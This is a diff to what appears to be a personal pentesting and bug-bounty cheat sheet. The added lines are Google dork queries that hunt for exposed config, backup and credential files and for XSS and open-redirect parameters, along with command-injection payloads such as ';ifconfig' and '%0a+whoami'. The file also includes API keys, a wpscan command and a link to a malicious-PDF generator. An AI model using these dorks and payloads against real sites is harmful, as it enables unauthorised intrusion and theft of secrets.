@@ -4,7 +4,7 @@ $ wpscan --url https://target.com --api-token zBsi404GGCMKGzTraiEsSsQsFXCsUVWmaD
 						fUbnO3O6ia9QZDTESDeFcbLsUYwEpKMihrxfINqX7co
 https://github.com/jonaslejon/malicious-pdf	=> Malicious pdf generator 
 
-needle.get(`https://api.ipgeolocation.io/ipgeo?apiKey=2bcdcb179e8a43759c03cd4bb10ff1ec&ip=${args[1]}`
+needle.get(`https://api.ipgeolocation.io/ipgeo?apiKey=2bcdcb179e8a43759c03cd4bb10ff1ecso&ip=${args[1]}`
 
 connect to google shell =>
 #export PATH=$PATH:/snap/bin
@@ -272,6 +272,13 @@ site:firebaseio.com "example"
 site:jfrog.io "example"
 site:http://s3-external-1.amazonaws.com "example.com"
 site:http://s3.dualstack.us-east-1.amazonaws.com "example.com"
+site:"example[.]com"  ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | txt:svn  | ext:htpasswd | ext:htaccess 
+xss params
+inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang=   inurl:&   site:example.com
+open redirect 
+inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page=  inurl:& inurl:http site:example.com
+all params
+site:example.com ext:php inurl:?
 
 
 
@@ -1473,6 +1480,16 @@ Automatic Scanners :-
     https://github.com/s0md3v/Corsy
     https://github.com/Shivangx01b/CorsMe
 -----------------------------------------------------------------------------------------------------
+Command Injection
+10.10.1.1;ifconfig
+10.19.1.2&+whoami
+10.0.0.1%0a+whoami
+10.10.10.1%0a%09
+10.10.1.1%0a${IFS}
+127.0.0.1%0a{ls,-la
+
+
+----------------------------------------------------------------------------------------------------------
 File Upload 
 
 1- If pdf accepted then upload xss.pdf  => https://github.com/teamhackeregypt/mythology/blob/main/xss.pdf
